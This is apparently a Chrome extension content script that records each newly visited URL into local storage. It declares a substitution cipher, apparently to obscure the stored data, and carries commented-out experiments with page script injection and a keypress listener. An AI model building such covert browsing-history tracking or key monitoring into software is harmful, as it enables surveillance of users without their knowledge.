/***************************
**  Variable Declaration  **
***************************/

/**
* @purpose: establish fixed references
* @param: StorageArea: access to chrome local storage in 00003.log
* @param: cipher: precomputed substitution cipher (later replaced by RSA)
* @param: prevhref: previous link to check whether link has changed
**/
var StorageArea = chrome.storage.local;
var cipher = { '0': 't', '1': 'S', '2': ' ', '3': 'm', '4': '9', '5': 'L', '6': 'h', '7': 'q', '8': 'B', '9': '4', u: 'd', d: 'u', '<': 'W', W: '<', m: '3', '$': '(', '(': '$', ' ': '2', B: '8', Q: '#', '#': 'Q', '[': ',', ',': '[', N: '\'', '\'': 'N', v: 'O', O: 'v', s: '?', '?': 's', ')': '`', '`': ')', '>': '}', '}': '>', q: '7', E: 'Z', Z: 'E', H: 'V', V: 'H', '.': '|', '|': '.', S: '1', D: 'y', y: 'D', n: '^', '^': 'n', '&': ':', ':': '&', J: '_', _: 'J', K: 'b', b: 'K', c: 'g', g: 'c', X: 'f', f: 'X', T: '-', '-': 'T', h: '6', r: '/', '/': 'r', '*': 'k', k: '*', M: '%', '%': 'M', I: 'i', i: 'I', '+': 'p', p: '+', R: ';', ';': 'R', j: 'l', l: 'j', U: 'w', w: 'U', '~': 'z', z: '~', t: '0', L: '5', ']': '=', '=': ']', '{': 'F', F: '{', e: 'P', P: 'e', '"': 'a', a: '"', o: 'x', x: 'o', '@': 'Y', Y: '@', '\\': 'G', G: '\\', C: '', '': 'C', '!': 'A', A: '!' };
var prevhref;



/****************
**  Listeners  **
****************/

/**
* @purpose: store the url if it is different, then update prevhref
* @note: receives message from the background, which has access to tabs api
**/
chrome.runtime.onMessage.addListener(function(request, sender)
{
    if (request.message != prevhref)
    {
        storeUrl(request.message);
        prevhref = request.message;
    }
})

/**
* function sendMessage(msg)
* @purpose: sends this message from content script to the background page
* @param: msg: the message to be sent
**/
function sendMessage(msg)
{
    chrome.extension.sendMessage({message: msg});
}

/**
* @purpose: window load callbacks
* @note: currently kind of working, test only
**/
// window.onload = function()
// {
//     // storeUrl();
// }
// window.onunload = function()
// {
//     // storeUrl();
// }
// window.onclose = function()
// {
//     // end session
// }

/**
* @purpose: checks page every second to check whether url has changed
* checks every second whether url has changed
* @prevhref: previous url
**/
// setInterval(function()
// {
//     if (location.href != prevhref)
//     {
//         storeUrl();
//         prevhref = location.href;
//     }
// }, 1000);



/*******************************
**  Loading External Scripts  **
*******************************/

/**
* @purpose: adding files to be executed at a document's head
* @note: currently not working
**/
// var fetch = document.createElement("script");
// fetch.src = chrome.extension.getURL("fetch.js");
// fetch.onload = function(){this.parentNode.removeChild(this);};
// (document.head || document.documentElement).appendChild(fetch);
// var storage = document.createElement("script");
// storage.src = chrome.extension.getURL("storage.js");
// storage.onload = function(){this.parentNode.removeChild(this);};
// (document.head || document.documentElement).appendChild(storage);

/**
* @purpose: adding inline functions
* @note: currently not working
**/
// var code = '(' + function()
// {
//     console.log("new tab opened");
// } + ')();';
// var script = document.createElement("script");
// script.textContent = code;
// (document.head || document.documentElement).appendChild(script);
// script.parentNode.removeChild(script);



/****************************
**  Example Key Detection  **
****************************/

/**
* @purpose: responds to keypress of z
* @note: do not use for anything
**/
// if (window == top)
// {
//     window.addEventListener("keyup", function(event)
//     {
//         if (event.keyCode == 90) // if key pressed is z
//         {
//             sendMessage("testing message sending");
//         }
//     }, false);
// }